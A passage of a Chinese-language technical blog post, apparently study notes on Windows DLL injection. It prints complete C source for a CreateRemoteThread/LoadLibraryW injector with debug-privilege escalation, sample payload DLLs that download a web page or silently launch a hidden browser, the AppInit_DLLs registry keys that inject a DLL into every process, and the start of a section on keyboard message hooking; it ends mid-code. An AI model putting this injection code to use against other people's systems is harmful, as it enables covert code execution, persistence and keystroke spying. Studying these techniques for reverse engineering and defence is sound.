class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;urlmon.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_URL     (<span class="string">L&quot;http://www.naver.com/index.html&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_FILE_NAME   (<span class="string">L&quot;index.html&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">HMODULE g_hMod = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">    TCHAR szPath[_MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) )</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    TCHAR *p = _tcsrchr( szPath, <span class="string">&#x27;\\&#x27;</span> );</span><br><span class="line">    <span class="keyword">if</span>( !p )</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="comment">//下载指定网站的index.html</span></span><br><span class="line">    _tcscpy_s(p+<span class="number">1</span>, _MAX_PATH, DEF_FILE_NAME);</span><br><span class="line"></span><br><span class="line">    URLDownloadToFile(<span class="literal">NULL</span>, DEF_URL, szPath, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    g_hMod = (HMODULE)hinstDLL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>( fdwReason )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH : <span class="comment">//加载时</span></span><br><span class="line">        OutputDebugString(<span class="string">L&quot;&lt;myhack.dll&gt; Injection!!!&quot;</span>); <span class="comment">//输出调试字符串</span></span><br><span class="line">        hThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>); <span class="comment">//创建线程</span></span><br><span class="line">        CloseHandle(hThread);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在DllMain()函数中可以看到，该DLL被加载（DLL_PROCESS_ATTACH）时，先输出一个调试字符串（“myhack.dll Injection!!!”），然后创建线程调用函数（ThreadProc）。在ThreadProc()函数中通过调用urlmon!URLDownloadToFile() API来下载指定网站的index.html文件。前面提到过，向进程注入DLL后就会调用执行该DLL的DllMain()函数。所以当myhack.dll注入notepad.exe进程后，最终会调用执行URLDownloadToFile()API。</p></blockquote><p><strong>InjectDII.cpp</strong>InjectDll.exe程序用来将myhack.dll注入notepad.exe进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> </span><br><span class="line">&#123;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, </span><br><span class="line">              &amp;hToken) )</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;OpenProcessToken error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !LookupPrivilegeValue(<span class="literal">NULL</span>,           <span class="comment">// lookup privilege on local system</span></span><br><span class="line">                              lpszPrivilege,  <span class="comment">// privilege to lookup </span></span><br><span class="line">                              &amp;luid) )        <span class="comment">// receives LUID of privilege</span></span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;LookupPrivilegeValue error: %u\n&quot;</span>, GetLastError() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span>( bEnablePrivilege )</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line">    <span class="keyword">if</span>( !AdjustTokenPrivileges(hToken, </span><br><span class="line">                               FALSE, </span><br><span class="line">                               &amp;tp, </span><br><span class="line">                               <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES), </span><br><span class="line">                               (PTOKEN_PRIVILEGES) <span class="literal">NULL</span>, </span><br><span class="line">                               (PDWORD) <span class="literal">NULL</span>) )</span><br><span class="line">    &#123; </span><br><span class="line">        _tprintf(<span class="string">L&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, GetLastError() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( GetLastError() == ERROR_NOT_ALL_ASSIGNED )</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;The token does not have the specified privilege. \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hProcess = <span class="literal">NULL</span>, hThread = <span class="literal">NULL</span>;</span><br><span class="line">    HMODULE hMod = <span class="literal">NULL</span>;</span><br><span class="line">    LPVOID pRemoteBuf = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</span><br><span class="line">    LPTHREAD_START_ROUTINE pThreadProc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #1. 使用 dwPID 获取目标进程(notepad.exe)句柄（PROCESS_ALL_ACCESS权限），然后就可以用 hProcess 控制进程.</span></span><br><span class="line">    <span class="keyword">if</span> ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )</span><br><span class="line">    &#123;        <span class="comment">//OpenProcess调用API，借助PID获取目标权限</span></span><br><span class="line">        _tprintf(<span class="string">L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;</span>, dwPID, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #2. 在目标进程(notepad.exe) 内存中分配 szDllName 大小的内存，返回 pRemoteBuf 作为该缓冲区的地址.</span></span><br><span class="line">    pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #3. 将 myhack.dll 路径写入刚刚分配的缓冲区.</span></span><br><span class="line">    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #4. 获取 LoadLibraryW() API 地址，kernel32.dll在每个进程中的加载地址相同（这个特性就是我们要利用的）.</span></span><br><span class="line">    hMod = GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #5. 在 notepad.exe 中运行线程</span></span><br><span class="line">    hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( argc != <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// change privilege</span></span><br><span class="line">    <span class="keyword">if</span>( !SetPrivilege(SE_DEBUG_NAME, TRUE) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject dll</span></span><br><span class="line">    <span class="keyword">if</span>( InjectDll((DWORD)_tstol(argv[<span class="number">1</span>]), argv[<span class="number">2</span>]) )</span><br><span class="line">        _tprintf(<span class="string">L&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        _tprintf(<span class="string">L&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>InjectDll()函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)</span><br></pre></td></tr></table></figure><p>调用OpenProcess API,借助程序运行时以参数形式传递过来的dwPID值，获取notepad.exe进程的句柄（PROCESS_ALL_ACCESS权限）。得到PROCESS_ALL_ACCESS权限后，就可以使用获取的句柄（hProcess ）控制对应进程</p><p>将要注入的DLL路径写入目标进程内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEMCOMMIT, PAGEREADWRITE);</span><br></pre></td></tr></table></figure><p>需要把即将加载的DLL文件的路径告知目标进程。因为任何内存空间都无法进行写入操作，故先使用VirtualAllocEx() API在目标进程的内存空间中分配一块缓冲区，且指定该缓冲区的大小为DLL文件路径字符串的长度（含Terminating NULL ）即可。</p><blockquote><p>VirtualAllocEx()函数的返回值（pRemoteBuf）为分配所得缓冲区的地址。该地址并不是程序（Inject.exe ）自身进程的内存地址，而是hProcess句柄所指目标进程（notepad.exe）的内存地址，请务必牢记这一点。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID) szDUName, dwBufSize, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>使用WriteProcessMemory() API将DLL路径字符串写入分配所得缓冲区（pRemoteBuf）地址。WriteProcessMemory API所写的内存空间也是hProcess句柄所指的目标进程的内存空间。</p><p>获取LoadLibraryW() API地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hMod = GetModuleHandle(<span class="string">&quot;kernel32 .dll&quot;</span>);</span><br><span class="line">pThreadProc = (LPTHREAD_STARTROUTINE)GetProcAddress(hMod, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br></pre></td></tr></table></figure><p>调用LoadLibrary() API前先要获取其地址（LoadLibraryW()是LoadLibrary()的Unicode字符串版本）。</p><p>最重要的是理解好以上代码的含义。我们的目标明明是获取加载到notepad.exe进程的kernel32.dll的LoadLibraryW() API的起始地址，但上面的代码却用来获取加载到InjectDll.exe进程的kernel32.dll的LoadLibraryW() API的起始地址。如果加载到notepad.exe进程中的kemel32.dll的地址与加载到InjectDll.exe进程中的kemel32.dll的地址相同，那么上面的代码就不会有什么问题。但是如果kemel32.dll在每个进程中加载的地址都不同，那么上面的代码就错了，执行时会发生内存引用错误。</p><p><strong>其实在Windows系统中，kernel32.dll在每个进程中的加载地址都是相同的。</strong></p><p>《Windows核心编程》一书中对此进行了介绍，此后这一特性被广泛应用于DLL注入技术。</p><p>为什么要去获取LoadLibraryW() API的起始地址?不能直接写代码调用嘛</p><p>不是在当前进程执行代码，而是让目标进程执行代码</p><p>当调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateRemoteThread(hProcess, ..., LoadLibraryW, pRemotePath, ...)</span><br></pre></td></tr></table></figure><p>在 <strong>notepad.exe</strong> 里面创建一个线程 让这个线程从 <code>LoadLibraryW</code> 地址开始执行</p><p>注意！这个线程是在,notepad.exe 的地址空间里执行而不是在,InjectDll.exe 的地址空间</p><p>LoadLibraryW(L”test.dll”);这只会发生在：InjectDll.exe 进程内部</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateRemoteThread</span><span class="params">(</span></span><br><span class="line"><span class="params">  HANDLE                 hProcess,</span></span><br><span class="line"><span class="params">  LPSECURITY_ATTRIBUTES  lpThreadAttributes,</span></span><br><span class="line"><span class="params">  SIZE_T                 dwStackSize,</span></span><br><span class="line"><span class="params">  LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">  LPVOID                 lpParameter,</span></span><br><span class="line"><span class="params">  DWORD                  dwCreationFlags,</span></span><br><span class="line"><span class="params">  LPDWORD                lpThreadId</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>lpParameter：pRemoteBuf这个参数会作为：LoadLibraryW 的参数</p><p>除第一个参数hProcess外，其他参数与CreateThread()函数完全一样。hProcess参数是要执行线程的目标进程（或称远程进程、宿主进程）的句柄。IpStartAddress与IpParameter参数分别给出线程函数地址与线程参数地址。需要注意的是，这2个地址都应该在目标进程虚拟内存空间中。</p><blockquote><p>一般而言，DLL文件的ImageBase默认为0x10000000，依次加载a.dll与b.dll时，先加载的a.dll被正常加载到0x10000000地址处，后加载的b.dll无法再被加载到此，而是加载到其他空白地址空间，也就是说，该过程中发生了 DLL重定位（因为a.dll已经先被加载到它默认的地址处）。<br>若kemel32.dll加载到各个进程时地址各不相同，那么上述代码肯定是错误的。但实际在Windows操作系统中，kemel32.dll不管在哪个进程都会被加载至相同地址。为什么会这样呢？我借助PEView软件查看了 Windows操作系统的核心DLL文件的 ImageBase值，罗列如下表（Windows XP SP3版本，根据Windows更新不同，各值会有变化）。</p></blockquote><p>Windows 的做法是：</p><blockquote><p>给系统核心 DLL 预留固定地址 所有进程都映射到同一个虚拟地址， 这样就可以共享同一份物理内存页</p></blockquote><p><strong>kernel32.dll 是 Windows 提供基础系统功能的核心用户层 DLL。</strong></p><p>负责：进程管理 线程管理 内存管理 文件操作 控制台 同步机制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CreateFile (kernel32)</span><br><span class="line">    ↓</span><br><span class="line">NtCreateFile (ntdll)</span><br><span class="line">    ↓</span><br><span class="line">系统调用</span><br><span class="line">    ↓</span><br><span class="line">ntoskrnl.exe</span><br></pre></td></tr></table></figure><p>在目标进程中运行远程线程（Remote Thread）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">pThreadProc = notepad.exe进程内存中的LoadLibrary()地址</span><br><span class="line">pRemoteBuf = notepad.exe进程内存中的 “c:\work\myhack.dll” 字符串地址</span><br></pre></td></tr></table></figure><p>一切准备就绪后，最后向notepad.exe发送一个命令，让其调用LoadLibraryW() API函数加载指定的DLL文件即可，遗憾的是Windows并未直接提供执行这一命令的API。但是我们可以另辟蹊径，使用CreateRemoteThread()这个API （在DLL注入时几乎总会用到）。</p><h2 id="AppInit-DLLs"><a href="#AppInit-DLLs" class="headerlink" title="AppInit_DLLs"></a>AppInit_DLLs</h2><p>进行DLL注入的第二种方法是使用注册表，WindowsOS的注册表中默认提供了AppInit_DLLs与LoadAppInit_DLLs两个注册表项</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260216154158784.png" alt="image-20260216154158784"></p><p>只要将要注入DLL的路径写入AppInit_DLLs项目，并在LoadAppInit_DLLs中设置值为1，重启时，系统就会将指定的DLL注入到所有运行进程中。主要原理是User32.dll被加载到进程时，会读取AppInit_DLLs注册表项，若值为1，就调用LoadLibrary()函数加载用户DLL。所以严格来说，是将注入DLL加载到使用user32.dll的进程中。</p><p>注：Windows XP会忽略LoadAppInit_DLLs注册表项。</p><blockquote><p><strong>User32.dll 是 Windows 提供图形界面和窗口管理的核心 DLL。</strong></p><p>负责：窗口 消息循环 键盘鼠标输入 对话框 按钮控件 消息机制</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// myhack2.cpp</span></span><br><span class="line"><span class="comment">// 主要作用是以隐藏模式运行IE，连接到指定网站</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_CMD  <span class="string">L&quot;c:\\Program Files\\Internet Explorer\\iexplore.exe&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_ADDR <span class="string">L&quot;http://www.naver.com&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_DST_PROC <span class="string">L&quot;notepad.exe&quot;</span></span></span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">    TCHAR szCmd[MAX_PATH]  = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    TCHAR szPath[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    TCHAR *p = <span class="literal">NULL</span>;</span><br><span class="line">    STARTUPINFO si = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"></span><br><span class="line">    si.cb = <span class="keyword">sizeof</span>(STARTUPINFO);</span><br><span class="line">    si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">    si.wShowWindow = SW_HIDE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>( fdwReason )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH : </span><br><span class="line">        <span class="keyword">if</span>( !GetModuleFileName( <span class="literal">NULL</span>, szPath, MAX_PATH ) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( !(p = _tcsrchr(szPath, <span class="string">&#x27;\\&#x27;</span>)) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( _tcsicmp(p+<span class="number">1</span>, DEF_DST_PROC) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        wsprintf(szCmd, <span class="string">L&quot;%s %s&quot;</span>, DEF_CMD, DEF_ADDR);</span><br><span class="line">        <span class="keyword">if</span>( !CreateProcess(<span class="literal">NULL</span>, (LPTSTR)(LPCTSTR)szCmd, </span><br><span class="line">                            <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, </span><br><span class="line">                            NORMAL_PRIORITY_CLASS, </span><br><span class="line">                            <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( pi.hProcess != <span class="literal">NULL</span> )</span><br><span class="line">            CloseHandle(pi.hProcess);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>被注入的进程时64位，那么注入的DLL也应该是64位，32位对应32位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 将下面注册表的键对应的值设置为要注入的 DLL的路径</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs </span><br><span class="line"># 将下面注册表的键对应的值设置为 1</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs </span><br></pre></td></tr></table></figure><p>注入64位进程，应该修改的注册表键为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将下面注册表的键对应的值设置为要注入的 DLL的路径</span></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\WindowsNT\CurrentVersion\Windows\AppInit_DLLs</span><br><span class="line"><span class="comment"># 将下面注册表的键对应的值设置为 1</span></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\WindowsNT\CurrentVersion\Windows\LoadAppInit_DLLs</span><br></pre></td></tr></table></figure><h2 id="Windows消息钩取"><a href="#Windows消息钩取" class="headerlink" title="Windows消息钩取"></a>Windows消息钩取</h2><p><a href="https://www.cnblogs.com/Zer0o/p/17249259.html#%E8%B0%83%E8%AF%95main%E5%87%BD%E6%95%B0">DLL注入-Windows消息钩取 - Zer0o - 博客园</a></p><p>敲击键盘时，消息会从OS移动到应用程序，而<strong>消息钩子</strong>就是在这个过程中偷看信息</p><p><strong>常规Windows消息流：</strong></p><ol><li>发生键盘输入事件时，WM_KEYDOWN消息被添加到[OS message queue]；</li><li>OS判断哪个应用程序中发生了事件，然后从[OS message queue]中取出消息，添加到相应应用程序的[application message queue]</li><li>应用程序监视自身的[application message queue]，发现新添加的WM_KEYDOWN消息后，调用相应的事件处理程序处理。</li></ol><p>附带钩子的信息流：</p><ol><li>发生键盘输入事件，WM_KEYDOWN消息被添加到OS消息队列；</li><li>OS判断哪个应用程序发生了事件，从OS消息队列中取出消息，发送给应用程序；</li><li>钩子程序截取信息，对消息采取一定的动作（因钩子目的而定）；</li><li>如钩子程序不拦截消息，消息最终传输给应用程序，此时的消息可能经过了钩子程序的修改。</li></ol><p>SetWindowsHookEx()</p><p>在Windows中可以使用<a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa">SetWindowsHookEx()API</a>来设置消息钩子，这个函数除了可以设置当前进程的钩子之外，它还可以设置全局钩子。全局钩子，顾名思义，即当前正在运行的进程都会被设置相应的钩子。</p><blockquote><p>Windows API作用类似是一个个功能函数。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HHOOK <span 